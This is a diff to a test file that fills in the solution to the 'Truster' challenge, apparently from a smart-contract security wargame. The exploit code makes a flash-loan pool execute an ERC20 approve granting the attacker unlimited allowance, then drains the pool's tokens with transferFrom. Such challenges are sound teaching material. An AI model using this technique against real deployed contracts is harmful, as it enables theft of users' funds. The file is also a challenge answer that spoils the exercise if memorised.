@@ -28,7 +28,16 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        // lender pool will execute an arbitrary function call, an attacker can make the pool
+        // approve a token spend to steal all the funds
+        const abi = [
+            "function approve(address spender, uint256 amount) external returns (bool)"
+        ];
+        const iface = new ethers.utils.Interface(abi);
+        const calldata = iface.encodeFunctionData('approve', [attacker.address, ethers.constants.MaxUint256]);
+
+        await this.pool.connect(attacker).flashLoan(0, this.pool.address, this.token.address, calldata);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
